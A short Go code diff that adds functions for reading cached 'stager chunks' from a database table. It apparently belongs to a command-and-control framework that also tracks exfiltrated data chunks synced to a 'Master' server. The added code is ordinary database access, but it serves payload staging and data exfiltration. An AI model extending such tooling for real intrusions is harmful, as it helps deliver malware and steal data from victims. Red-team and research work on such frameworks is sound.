@@ -930,6 +930,50 @@ func (d *Database) CacheStagerChunks(clientBinaryID string, chunks []string) err
 	return tx.Commit()
 }
 
+// GetCachedStagerChunks retrieves all cached stager chunks for local delivery
+func (d *Database) GetCachedStagerChunks() ([]string, bool) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+		SELECT chunk_data FROM stager_chunk_cache
+		ORDER BY client_binary_id, chunk_index
+		LIMIT 1000
+	`)
+	if err != nil {
+		return nil, false
+	}
+	defer rows.Close()
+
+	var chunks []string
+	for rows.Next() {
+		var chunk string
+		if err := rows.Scan(&chunk); err != nil {
+			continue
+		}
+		chunks = append(chunks, chunk)
+	}
+
+	return chunks, len(chunks) > 0
+}
+
+// GetCachedStagerChunk retrieves a specific cached stager chunk by index
+func (d *Database) GetCachedStagerChunk(clientBinaryID string, chunkIndex int) (string, bool) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var chunk string
+	err := d.db.QueryRow(`
+		SELECT chunk_data FROM stager_chunk_cache
+		WHERE client_binary_id = ? AND chunk_index = ?
+	`, clientBinaryID, chunkIndex).Scan(&chunk)
+
+	if err != nil {
+		return "", false
+	}
+	return chunk, true
+}
+
 // MarkExfilChunkSynced marks a chunk as successfully uploaded to Master
 func (d *Database) MarkExfilChunkSynced(sessionID string, chunkIndex int) error {
 	d.mutex.Lock()
